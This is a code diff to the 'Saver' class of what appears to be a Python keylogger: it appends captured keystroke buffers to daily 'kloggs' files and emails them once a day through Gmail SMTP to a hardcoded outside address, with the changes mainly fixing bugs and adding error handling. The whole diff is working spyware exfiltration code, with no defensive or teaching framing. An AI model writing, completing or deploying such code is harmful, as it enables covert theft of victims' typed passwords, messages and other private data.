@@ -12,23 +12,27 @@ class Saver():
         self.current_time = time.localtime()
         self.filename = ""
         self.smptserver = 'smtp.gmail.com:587'
-        self.emailuser = "senderlogin"
-        self.emailpasswd = "sendderpassword"
-        self.emailaddr = "sendermail"
+        self.emailuser = "youracc"
+        self.emailpasswd = "yourpassword"
+        self.emailaddr = "youracc@gmail.com"
         self.emaildest = "anondhc@gmail.com"
         ##
 
     def write_to_file(self, buffer):
-        #DONT TESTED
         now_time = time.localtime()
         if (now_time[2] != self.current_time[2]):  # send email once per day
             self.send_to_email()
+            self.set_current_time()
             pass
         else:
-            self.current_time = time.localtime()
+            self.set_current_time()
             self.filename = ("kloggs_%s_%s_%s.txt" % (self.current_time[0], self.current_time[1], self.current_time[2]))
-            print self.filename
-            file = open(self.filename, "ab").write(buffer)
+            #print self.filename
+            try:
+                file = open(self.filename, "ab").write(buffer)
+                file.close()
+            except AttributeError:
+                pass
 
 
     def send_to_email(self):
@@ -43,7 +47,7 @@ class Saver():
         msg = MIMEMultipart()
         msg['Subject'] = SUBJECT
         msg['From'] = self.emailaddr
-        msg['To'] = ', '.join(self.emaildest)
+        msg['To'] = ','.join(self.emaildest)
 
         part = MIMEBase('application', "octet-stream")
         part.set_payload(open(self.filename, "rb").read())
@@ -58,5 +62,6 @@ class Saver():
         self.current_time = time.localtime()
 
 #if __name__=="__main__":
-#    a=Saver()
-#    a.send_to_email()
+ #   a=Saver()
+ #   a.write_to_file("aaaa")
+ #   a.send_to_email()
